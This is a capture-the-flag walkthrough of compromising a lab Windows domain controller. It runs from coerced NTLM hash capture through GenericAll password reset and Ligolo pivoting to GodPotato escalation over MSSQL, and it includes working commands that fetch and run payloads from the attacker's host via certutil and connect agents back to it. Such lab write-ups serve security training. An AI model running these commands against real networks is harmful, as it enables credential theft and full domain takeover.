---
title: "Share The Pain"
platform: "HackSmarter"
category: "Windows"
difficulty: "Medium"
date: 2025-12-17
os: "Windows Server 2022"
tags: ["windows", "ad", "responder", "ntlm", "slinky", "genericall", "acl-abuse", "mssql", "seimpersonate", "godpotato", "ligolo", "pivoting", "bloodhound", "uwu-toolkit"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/sharethepain/img-000.png" alt="Share The Pain Banner" style="max-width: 100%;" />
</div>

---

## Overview

**Platform:** HackSmarter
**OS:** Windows Server 2022 Build 20348
**Difficulty:** Medium
**IP:** `10.1.124.132`
**Domain:** `hack.smarter`
**Hostname:** `DC01`

---

## Objective

As a penetration tester on the Hack Smarter Red Team, the mission is to infiltrate and seize control of the client's entire Active Directory environment. This engagement grants direct access to the internal network but no credentials - requiring full enumeration, exploitation, and privilege escalation to achieve complete domain compromise.

> **Note:** This walkthrough demonstrates **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)**, an integrated penetration testing framework currently in development.

---

## Enumeration

### Port Scanning

The engagement begins with comprehensive port enumeration using UwU Toolkit's integrated nmap module to identify available services on the target.

```
[*] Command: nmap -sC -sV -T4 -oA ./nmap_results/scan_10.1.124.132_standard 10.1.124.132

Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-17 23:52 PST
Nmap scan report for DC01.hack.smarter (10.1.124.132)
Host is up (0.071s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-17 16:52:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Not valid before: 2025-09-05T03:46:00
|_Not valid after: 2026-03-07T03:46:00
|_ssl-date: 2025-12-17T16:52:21+00:00; -15h00m38s from scanner time.
| rdp-ntlm-info:
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-17T16:52:11+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-17T16:52:14
|_  start_date: N/A
|_clock-skew: mean: -15h00m38s, deviation: 0s, median: -15h00m38s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

[+] Module completed successfully
```

The scan reveals a Windows Server 2022 Domain Controller with standard Active Directory services. Key observations:

- **Domain Controller** confirmed via Kerberos (88), LDAP (389), and DNS (53)
- **Domain:** `hack.smarter`
- **Hostname:** `DC01`
- **SMB signing enabled and required** - eliminates relay attack possibilities
- **RDP available** on port 3389
- **Clock skew detected** (-15h00m38s) - important for Kerberos authentication

### SMB Share Enumeration

With no credentials provided, testing for null session authentication against SMB shares using UwU Toolkit's `smb_shares` module.

```
UwU Toolkit smb_shares > run
[*] Running smb_shares...

[*] Starting SMB share enumeration on 10.1.124.132
[*] No credentials provided - testing multiple auth methods
[*] [1/3] Testing null session...

[*] Command: nxc smb 10.1.124.132 --shares -u  -p

SMB  10.1.124.132  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.1.124.132  445  DC01  [+] hack.smarter\:
SMB  10.1.124.132  445  DC01  [*] Enumerated shares
SMB  10.1.124.132  445  DC01  Share           Permissions     Remark
SMB  10.1.124.132  445  DC01  -----           -----------     ------
SMB  10.1.124.132  445  DC01  ADMIN$                          Remote Admin
SMB  10.1.124.132  445  DC01  C$                              Default share
SMB  10.1.124.132  445  DC01  IPC$                            Remote IPC
SMB  10.1.124.132  445  DC01  NETLOGON                        Logon server share
SMB  10.1.124.132  445  DC01  Share           READ,WRITE
SMB  10.1.124.132  445  DC01  SYSVOL                          Logon server share
```

A critical misconfiguration is identified: **null authentication is enabled**, and the `Share` share grants **READ,WRITE permissions** to unauthenticated users. This presents an opportunity for NTLM credential coercion attacks.

---

## Initial Access

### NTLM Hash Capture with Slinky

With write access to an SMB share, the attack leverages the NetExec `slinky` module to plant malicious shortcut files that coerce NTLM authentication back to the attacker's machine. First, Responder is started to capture incoming authentication attempts.

**Starting Responder:**
```bash
responder --interface tun0
```

**Deploying Slinky via UwU Toolkit:**
```
UwU Toolkit > use auxiliary/ad/netexec
[+] Using module: auxiliary/netexec

UwU Toolkit netexec > set NXC_MODULE slinky
NXC_MODULE => slinky

UwU Toolkit netexec > set NXC_MODULE_OPTIONS NAME=important SERVER=10.200.23.143
NXC_MODULE_OPTIONS => NAME=important SERVER=10.200.23.143

UwU Toolkit netexec > setg RHOSTS 10.0.19.55
RHOSTS => 10.0.19.55 (global)
```

The slinky module creates a malicious `.lnk` file pointing to the attacker's IP. When a domain user browses the share, Windows automatically attempts to resolve the UNC path, sending their NTLMv2 hash to Responder.

**Captured Hash:**
```
[SMB] NTLMv2-SSP Client   : 10.1.124.132
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:1122334455667788:0235AC6019A663BDB62675BB6FC975DD:010100000000000000C96481B26FDC011B92687D2EAB11110000000002000800330044005A00500001001E00570049004E002D005000550031004C00470050003600380036005100460004003400570049004E002D005000550031004C004700500036003800360051004600...
```

### Cracking the Hash

The captured NTLMv2 hash is cracked using UwU Toolkit's integrated `hashcrack` module, which automatically identifies the hash type and leverages GPU acceleration via a remote cracking rig.

```
UwU Toolkit hashcrack > set HASHFILE /workspace/bob
HASHFILE => /workspace/bob

UwU Toolkit hashcrack > run
[*] Running hashcrack...

[*] Loaded hashes from: /workspace/bob
[*] No hash type specified, attempting to identify...
[+] Detected hash type: NetNTLMv2 (mode: 5600)

[*] Sample hash: bob.ross::HACK:1122334455667788:94996B8DF5C3DD2233...

[?] Use hash type 5600 (NetNTLMv2)? [Y/n]: y
[*] Transferring hashes to omarchy...
[*] Running hashcat on omarchy...
[*] Command: hashcat -m 5600 /tmp/uwu_hashes_93600.txt ~/tools/rockyou.txt

hashcat (v7.1.2) starting

CUDA API (CUDA 13.0)
====================
* Device #01: NVIDIA GeForce RTX 4070 Laptop GPU, 6951/7805 MB, 36MCU

Dictionary cache built:
* Filename..: /home/p3ta/tools/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

BOB.ROSS::HACK:1122334455667788:94996b8df5c3dd223317e97787236e1c:...:137Password123!@#
```

**Credentials obtained:** `bob.ross:137Password123!@#`

### Configuring UwU Toolkit

With valid credentials, UwU Toolkit's credential management system stores and automatically applies them to subsequent modules.

```
UwU Toolkit > creds add bob.ross 137Password123!@#

UwU Toolkit > creds show

Pwned Credentials
=================

User                      Domain               Password                  Hash
------------------------- -------------------- ------------------------- --------
bob.ross                  -                    137Password123!@#         -

Total: 1 credential(s)
```

The `hosts` command automatically discovers domain information and updates `/etc/hosts`:

```
UwU Toolkit > hosts -u
[*] Discovering hosts for 10.0.19.55...

SMB  10.0.19.55  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)

[!] Entry for 10.0.19.55 already exists in /etc/hosts
[+] DOMAIN => hack.smarter (global)
[*] DC => DC01 (global)
```

Setting bob.ross as the active credential for all modules:

```
UwU Toolkit > creds use bob.ross
[*] USER => bob.ross
[*] PASS => 137Password123!@#
[*] DOMAIN => hack.smarter
[+] Loaded credential: bob.ross
```

---

## Active Directory Enumeration

### BloodHound Collection

With valid domain credentials, Active Directory data is collected using the `bloodhound_collect` module for attack path analysis.

```
[+] Using module: auxiliary/bloodhound_collect

UwU Toolkit bloodhound_collect > run
[*] Running bloodhound_collect...

[*] Collector: bloodhound-python
[*] Target DC: 10.0.19.55
[*] Domain: hack.smarter
[*] User: bob.ross
[*] Collection: all
[*] Output: /workspace/bloodhound_output

[*] Command: bloodhound-python -u bob.ross -p [HIDDEN] -d hack.smarter -ns 10.0.19.55 -c all --zip

[*] Using local bloodhound-python
[+]  : Found AD domain: hack.smarter
[!]  : Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Connecting to LDAP server...
[+]  : Found 1 computers
[*] Connecting to LDAP server...
[+]  : Found 7 users
[+]  : Found 53 groups
[+]  : Done in 00M 14S
[+]  : Compressing output into 20251218020741_bloodhound.zip

[+] BloodHound collection completed!
[*] ZIP file saved to: /workspace/bloodhound_output/
[*] Import the output into BloodHound CE for analysis
```

### GenericAll ACL Misconfiguration

Analysis in BloodHound CE reveals a critical ACL misconfiguration: **bob.ross has GenericAll rights over alice.wonderland**.

<div style="text-align: center;">
  <img src="/assets/images/ctf/sharethepain/img-001.png" alt="BloodHound Attack Path - bob.ross GenericAll over alice.wonderland" style="max-width: 100%;" />
</div>

The GenericAll permission grants complete control over the target object, including the ability to reset the user's password without knowing the current one - a common Active Directory privilege escalation vector.

---

## Lateral Movement

### Password Reset via BloodyAD

Leveraging the GenericAll privilege, the `bloody_setpass` module resets alice.wonderland's password to a known value.

```
UwU Toolkit bloody_setpass > options

Module options:

Name               Current              Required  Description
------------------ ------------------- ---------- ----------------------------------
DOMAIN             hack.smarter         yes       Domain name
EXEGOL_CONTAINER                        no        Exegol container (auto-detect if empty)
NET_PASS           Password123          no        User-defined option
NEW_PASS           Password123          yes       New password for target
PASS               137Password123!@#    yes       Password for USER
RHOSTS             10.0.19.55           yes       Domain Controller IP
TARGET_USER        alice.wonderland     yes       Target user to reset password
USER               bob.ross             yes       Username with ACL permissions

UwU Toolkit bloody_setpass > run
[*] Running bloody_setpass...

[*] Target DC: 10.0.19.55
[*] Domain: hack.smarter
[*] Attacking User: bob.ross
[*] Target User: alice.wonderland
[*] New Password: Password123

[*] Command: bloodyAD -u bob.ross -p [HIDDEN] -d hack.smarter --host 10.0.19.55 set password alice.wonderland [HIDDEN]

[+] Password changed successfully!
[+] New credentials: alice.wonderland:Password123

[*] Next steps:
[*]   setg USER alice.wonderland
[*]   setg PASS Password123

[+] Module completed successfully
```

Adding the new credentials to the credential store:

```
UwU Toolkit bloody_setpass > creds add alice.wonderland Password123 -d hack.smarter
[+] Added credential: hack.smarter\alice.wonderland

UwU Toolkit bloody_setpass > creds show

Pwned Credentials
=================

User                      Domain               Password                  Hash
------------------------- -------------------- ------------------------- --------
bob.ross                  hack.smarter         137Password123!@#         -
alice.wonderland          hack.smarter         Password123               -

Total: 2 credential(s)
```

### Validating Credentials

Confirming the new credentials work via SMB:

```
UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 10.0.19.55
[*] Domain: hack.smarter
[*] User: alice.wonderland
[*] Protocol: SMB
[*] Action: check

[*] Executing: NetExec smb 10.0.19.55 -u alice.wonderland -p Password123 -d hack.smarter

[*] SMB  10.0.19.55  445  DC01  Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
[+] SMB  10.0.19.55  445  DC01  [+] hack.smarter\alice.wonderland:Password123

[+] Module completed successfully
```

### User Enumeration via LDAP

The NetExec `whoami` module reveals alice.wonderland's group memberships:

```
UwU Toolkit netexec > set NXC_MODULE whoami
NXC_MODULE => whoami

UwU Toolkit netexec > run

[*] Executing: NetExec ldap 10.0.19.55 -u alice.wonderland -p Password123 -d hack.smarter -M whoami

[*] LDAP  10.0.19.55  389  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter) (signing:None) (channel binding:No TLS cert)
[+] LDAP  10.0.19.55  389  DC01  [+] hack.smarter\alice.wonderland:Password123
    WHOAMI  10.0.19.55  389  DC01  Name: alice.wonderland
    WHOAMI  10.0.19.55  389  DC01  sAMAccountName: alice.wonderland
    WHOAMI  10.0.19.55  389  DC01  Enabled: Yes
    WHOAMI  10.0.19.55  389  DC01  Password Never Expires: Yes
    WHOAMI  10.0.19.55  389  DC01  Last logon: 2025-10-29 22:07:23 UTC
    WHOAMI  10.0.19.55  389  DC01  Password Last Set: 2025-12-17 19:13:57 UTC
    WHOAMI  10.0.19.55  389  DC01  Bad Password Count: 0
    WHOAMI  10.0.19.55  389  DC01  Distinguished Name: CN=alice.wonderland,CN=Users,DC=hack,DC=smarter
    WHOAMI  10.0.19.55  389  DC01  Member of: CN=Remote Management Users,CN=Builtin,DC=hack,DC=smarter
    WHOAMI  10.0.19.55  389  DC01  User SID: S-1-5-21-3782576407-3043698477-3578684825-1104
```

**alice.wonderland is a member of Remote Management Users** - enabling WinRM access to the Domain Controller.

### Evil-WinRM Session

Establishing an interactive shell via the `evil_winrm` module:

```
UwU Toolkit > use evil_winrm
[+] Using module: auxiliary/evil_winrm

UwU Toolkit evil_winrm > creds use 2
[*] USER => alice.wonderland
[*] PASS => Password123
[*] DOMAIN => hack.smarter
[+] Loaded credential: 2

UwU Toolkit evil_winrm > run
[*] Running evil_winrm...

[*] Target: 10.0.19.55:5985
[*] User: alice.wonderland
[*] Domain: hack.smarter
[*] Auth: password
[*] Tool: evil-winrm (Ruby)

[*] Command: /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/wrappers/evil-winrm -i 10.0.19.55 -u alice.wonderland -p [HIDDEN]

[+] Starting Evil-WinRM session...
[+] Creating tmux session: uwu-alice_wonderland@10-0-19-55
[*] Use Ctrl+b d to detach (background the session)
[*] Use 'sessions' to list, 'interact' to reattach

[detached (from session uwu-alice_wonderland@10-0-19-55)]

[+] Session 'uwu-alice_wonderland@10-0-19-55' is backgrounded
[*] Use 'sessions' to list, 'interact <name>' to reattach

[+] Module completed successfully
```

UwU Toolkit automatically manages sessions via tmux, allowing multiple shells to be backgrounded and resumed:

```
UwU Toolkit evil_winrm > sessions

  Tmux Sessions
  ==================================================

  Name                            Status       Created
  ------------------------------ ------------ --------------------
  uwu-alice_wonderland@10-0-19-55 detached    2025-12-17 12:01

  Use 'interact <name>' to attach, Ctrl+b d to detach
```

---

## Post-Exploitation

### User Privilege Enumeration

Interacting with the session to enumerate alice.wonderland's privileges:

```
UwU Toolkit evil_winrm > interact uwu-alice_wonderland@10-0-19-55
[*] Attaching to tmux session: uwu-alice_wonderland@10-0-19-55
[*] Use Ctrl+b d to detach

*Evil-WinRM* PS C:\Users\alice.wonderland\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeMachineAccountPrivilege     Add workstations to domain           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
```

The user has standard domain user privileges with no immediate escalation path. Internal network enumeration is required.

---

## Pivoting with Ligolo-ng

### Setting Up the Tunnel

To access internal services not exposed externally, Ligolo-ng is deployed for pivoting. UwU Toolkit provides integrated Ligolo management.

```
UwU Toolkit > ligolo 443
[*] Checking TUN interface 'ligolo'...
[+] TUN interface 'ligolo' ready

  ╔══════════════════════════════════════════════════════╗
  ║  Ligolo-ng Proxy                                     ║
  ║  Listening on 0.0.0.0:443                            ║
  ║  TUN Interface: ligolo                               ║
  ║  Ctrl+D - Background and return to UwU               ║
  ║  exit   - Exit Ligolo and return to UwU              ║
  ╚══════════════════════════════════════════════════════╝

INFO[0000] Loading configuration file ligolo-ng.yaml
INFO[0002] Listening on 0.0.0.0:443

    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥ by @Nicocha30!
  Version: dev

ligolo-ng »
```

### Deploying the Agent

The `ligolo_pivot` module automates agent deployment to compromised hosts:

```
UwU Toolkit > use ligolo_pivot
[+] Using module: post/ligolo_pivot

UwU Toolkit ligolo_pivot > run
[*] Running ligolo_pivot...

[*] Resolved tun0 -> 10.200.23.143
[*] Using session: uwu-alice_wonderland@10-0-19-55
[+] Found agent: ../ligolo-ng/agent.exe
[*] Target: WINDOWS
[*] Upload to: C:\Windows\Temp\agent.exe
[*] Connect to: 10.200.23.143:443

[*] Step 1: Uploading agent...
[*] Sending: upload ../ligolo-ng/agent.exe
[*] Waiting for upload to complete...

[*] Step 2: Executing agent...
[*] Sending: .\agent.exe -connect 10.200.23.143:443 -ignore-cert

[+] Agent deployed!
[*] Check your ligolo proxy for the new agent connection
[*] In ligolo: session -> 1 -> start

[+] Module completed successfully
```

The agent connects back to the Ligolo proxy:

```
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> .\agent.exe -connect 10.200.23.143:443 -ignore-cert

agent.exe : time="2025-12-17T13:23:24-08:00" level=warning msg="warning, certificate validation disabled"
time="2025-12-17T13:23:24-08:00" level=info msg="Connection established" addr="10.200.23.143:443"
```

### Configuring the Tunnel

Creating a new interface and adding routes to access the target's localhost via `240.0.0.1`:

```
[Agent : HACK\alice.wonderland@DC01] » interface_create --name ligolo2
INFO[0478] Creating a new ligolo2 interface...
INFO[0478] Interface created!

[Agent : HACK\alice.wonderland@DC01] » start --tun ligolo2
INFO[0950] Starting tunnel to HACK\alice.wonderland@DC01 (0e274b49419b)
```

Adding the route on the attacker machine:

```
shell ip route add 240.0.0.1/32 dev ligolo2
```

Verifying connectivity to the target's localhost:

```
Exegol ➜ /workspace x ping 240.0.0.1
PING 240.0.0.1 (240.0.0.1) 56(84) bytes of data.
64 bytes from 240.0.0.1: icmp_seq=1 ttl=64 time=71.2 ms
^C
```

### Internal Port Scan

Scanning the target's localhost through the pivot reveals additional services:

```
UwU Toolkit ligolo_pivot > shell nmap 240.0.0.1

Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-17 13:40 PST
Nmap scan report for 240.0.0.1
Host is up (0.062s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

**MSSQL (port 1433) is running on localhost** - not accessible externally but now reachable via the pivot.

---

## MSSQL Exploitation

### Testing Database Access

Using alice.wonderland's credentials against the MSSQL instance:

```
UwU Toolkit netexec > set execute whoami
EXECUTE => whoami

UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 240.0.0.1
[*] Domain: hack.smarter
[*] User: alice.wonderland
[*] Protocol: MSSQL
[*] Action: execute

[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p Password123 -d hack.smarter -x whoami

[*] MSSQL  240.0.0.1  1433  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:Password123 (admin)
[+] MSSQL  240.0.0.1  1433  DC01  [+] Executed command via mssqlexec
    MSSQL  240.0.0.1  1433  DC01  nt service\mssql$sqlexpress
```

alice.wonderland has **admin access to MSSQL**, and commands execute as the `mssql$sqlexpress` service account.

### Privilege Enumeration

Checking the service account's privileges:

```
UwU Toolkit netexec > set execute 'whoami /priv'
EXECUTE => 'whoami /priv'

UwU Toolkit netexec > run

[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p Password123 -d hack.smarter -x 'whoami /priv'

[*] MSSQL  240.0.0.1  1433  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:Password123 (admin)
[+] MSSQL  240.0.0.1  1433  DC01  [+] Executed command via mssqlexec
    MSSQL  240.0.0.1  1433  DC01  PRIVILEGES INFORMATION
    MSSQL  240.0.0.1  1433  DC01  ----------------------
    MSSQL  240.0.0.1  1433  DC01  Privilege Name                Description                               State
    MSSQL  240.0.0.1  1433  DC01  ============================= ========================================= ========
    MSSQL  240.0.0.1  1433  DC01  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
    MSSQL  240.0.0.1  1433  DC01  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
    MSSQL  240.0.0.1  1433  DC01  SeMachineAccountPrivilege     Add workstations to domain                Disabled
    MSSQL  240.0.0.1  1433  DC01  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
    MSSQL  240.0.0.1  1433  DC01  SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
    MSSQL  240.0.0.1  1433  DC01  SeImpersonatePrivilege        Impersonate a client after authentication Enabled
    MSSQL  240.0.0.1  1433  DC01  SeCreateGlobalPrivilege       Create global objects                     Enabled
    MSSQL  240.0.0.1  1433  DC01  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**SeImpersonatePrivilege is enabled!** This service account privilege enables token impersonation attacks for SYSTEM escalation.

---

## Privilege Escalation

### GodPotato Attack

The `seimpersonate` module automates the exploitation of SeImpersonatePrivilege using potato attacks. GodPotato is selected for Windows Server 2022 compatibility.

```
UwU Toolkit seimpersonate > run
[*] Running seimpersonate...

[*] Mode: NetExec (auto upload & execute)
[*] Target: 240.0.0.1
[*] User: hack.smarter\alice.wonderland
[*] Potato: GODPOTATO
[*]   GodPotato - Works on Windows 8-11, Server 2012-2022
[*] Execute Protocol: MSSQL

[+] Found local potato: /opt/my-resources/tools/potatoes/GodPotato.exe

[*] Step 1: Uploading potato via HTTP (certutil)...
[*] Starting HTTP server on 10.200.23.143:8080...
[+] HTTP server started
[*] Serving: http://10.200.23.143:8080/GodPotato.exe
[*] Downloading via certutil...
[*] Command: certutil -urlcache -split -f http://10.200.23.143:8080/GodPotato.exe C:\Windows\Temp\GodPotato.exe
[*] Executing via MSSQL...
[+] Download successful!

[*] Step 2: Executing potato...
[*] Executing via MSSQL...
[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "whoami"

[*] MSSQL  240.0.0.1  1433  DC01  [*] CombaseModule: 0x140719969927168
[*] MSSQL  240.0.0.1  1433  DC01  [*] DispatchTable: 0x140719972517752
[*] MSSQL  240.0.0.1  1433  DC01  [*] UseProtseqFunction: 0x140719971810096
[*] MSSQL  240.0.0.1  1433  DC01  [*] HookRPC
[*] MSSQL  240.0.0.1  1433  DC01  [*] Start PipeServer
[*] MSSQL  240.0.0.1  1433  DC01  [*] CreateNamedPipe \\.\pipe\914e786c-dd48-483e-8136-ef70b2c47ef6\pipe\epmapper
[*] MSSQL  240.0.0.1  1433  DC01  [*] Trigger RPCSS
[*] MSSQL  240.0.0.1  1433  DC01  [*] Pipe Connected!
[*] MSSQL  240.0.0.1  1433  DC01  [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] MSSQL  240.0.0.1  1433  DC01  [*] Start Search System Token
[*] MSSQL  240.0.0.1  1433  DC01  [*] PID : 940 Token:0x660 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] MSSQL  240.0.0.1  1433  DC01  [*] Find System Token : True
[*] MSSQL  240.0.0.1  1433  DC01  [*] CurrentUser: NT AUTHORITY\SYSTEM
[*] MSSQL  240.0.0.1  1433  DC01  [*] process start with pid 3276
[*] MSSQL  240.0.0.1  1433  DC01  nt authority\system

[+] SUCCESS! Running as NT AUTHORITY\SYSTEM

[+] Module completed successfully
```

### Changing Administrator Password

With SYSTEM execution capability, the domain administrator's password is changed:

```
UwU Toolkit seimpersonate > set EXECUTE net user administrator Password123
EXECUTE => net user administrator Password123

UwU Toolkit seimpersonate > run
[*] Running seimpersonate...

[*] Mode: NetExec (auto upload & execute)
[*] Target: 240.0.0.1
[*] User: hack.smarter\alice.wonderland
[*] Potato: GODPOTATO

[*] Step 1: Uploading potato via HTTP (certutil)...
[+] Download successful!

[*] Step 2: Executing potato...
[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "net user administrator Password123"

[*] MSSQL  240.0.0.1  1433  DC01  [*] CurrentUser: NT AUTHORITY\SYSTEM
[*] MSSQL  240.0.0.1  1433  DC01  [*] process start with pid 4948
[*] MSSQL  240.0.0.1  1433  DC01  The command completed successfully.

[+] SUCCESS! Running as NT AUTHORITY\SYSTEM

[+] Module completed successfully
```

### Administrator Access

Establishing an Evil-WinRM session as administrator confirms full domain compromise:

```
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Viewing all active sessions:

```
UwU Toolkit > sessions

  Tmux Sessions
  ===============================================================

  ID    Name                                     Status       Created
  ----- ---------------------------------------- ------------ ------------
  1     uwu-administrator@10-0-19-55             active       12-17 18:32
  2     uwu-alice_wonderland@10-0-19-55          detached     12-17 13:16
```

**Domain Administrator access achieved!**

---

## Credentials Summary

| User | Domain | Password | Method |
|------|--------|----------|--------|
| `bob.ross` | hack.smarter | `137Password123!@#` | NTLMv2 hash cracked via Responder/Slinky |
| `alice.wonderland` | hack.smarter | `Password123` | Password reset via GenericAll ACL abuse |
| `administrator` | hack.smarter | `Password123` | Changed via GodPotato SYSTEM execution |

---

## Attack Path Summary

```
[Reconnaissance]
     │
     ▼
┌─────────────────────────────────────┐
│  Nmap Enumeration                   │
│  → Domain Controller identified     │
│  → Windows Server 2022              │
│  → Standard AD ports exposed        │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  SMB Null Session                   │
│  → Share with READ,WRITE access     │
│  → Critical misconfiguration        │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  NTLM Hash Capture                  │
│  → Slinky module plants .lnk file   │
│  → Responder captures NTLMv2        │
│  → bob.ross hash obtained           │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  Hash Cracking                      │
│  → hashcat -m 5600 (NetNTLMv2)      │
│  → bob.ross:137Password123!@#       │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  BloodHound Enumeration             │
│  → bob.ross GenericAll over         │
│    alice.wonderland                 │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  ACL Abuse (BloodyAD)               │
│  → Password reset without knowing   │
│    current password                 │
│  → alice.wonderland:Password123     │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  WinRM Access                       │
│  → alice.wonderland in Remote       │
│    Management Users                 │
│  → Evil-WinRM session established   │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  Ligolo Pivoting                    │
│  → Agent deployed via Evil-WinRM    │
│  → Route 240.0.0.1 → localhost      │
│  → MSSQL discovered on 1433         │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  MSSQL Exploitation                 │
│  → alice.wonderland has admin       │
│  → xp_cmdshell enabled              │
│  → SeImpersonatePrivilege found     │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  Privilege Escalation               │
│  → GodPotato (SeImpersonate abuse)  │
│  → NT AUTHORITY\SYSTEM achieved     │
│  → Administrator password changed   │
└─────────────────────────────────────┘
     │
     ▼
┌─────────────────────────────────────┐
│  Domain Compromise                  │
│  → Full Administrator access        │
│  → Domain Controller owned          │
└─────────────────────────────────────┘
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)** | Integrated penetration testing framework |
| **Nmap** | Port scanning and service enumeration |
| **NetExec (nxc)** | SMB/LDAP/MSSQL enumeration and exploitation |
| **Responder** | NTLM hash capture via coerced authentication |
| **Hashcat** | GPU-accelerated password hash cracking |
| **BloodHound** | Active Directory attack path analysis |
| **BloodyAD** | Active Directory privilege abuse |
| **Evil-WinRM** | WinRM shell access |
| **Ligolo-ng** | Network pivoting and tunneling |
| **GodPotato** | SeImpersonate privilege escalation |

---

## Key Techniques

| Technique | MITRE ATT&CK |
|-----------|--------------|
| SMB Null Session Enumeration | T1021.002 |
| NTLM Credential Theft (Slinky) | T1187 |
| Password Cracking | T1110.002 |
| Active Directory Enumeration | T1087.002 |
| ACL Abuse (GenericAll) | T1222.001 |
| Password Reset | T1098 |
| Network Pivoting | T1090 |
| Token Impersonation (Potato) | T1134.001 |

---

## References

- [HackTricks - GenericAll Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
- [GodPotato - SeImpersonate Exploitation](https://github.com/BeichenDream/GodPotato)
- [Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng)
- [NetExec Slinky Module](https://www.netexec.wiki/smb-protocol/obtaining-credentials/slinky)
- [BloodyAD - Active Directory Privilege Abuse](https://github.com/CravateRouge/bloodyAD)
- [NTLM Theft Techniques](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication)

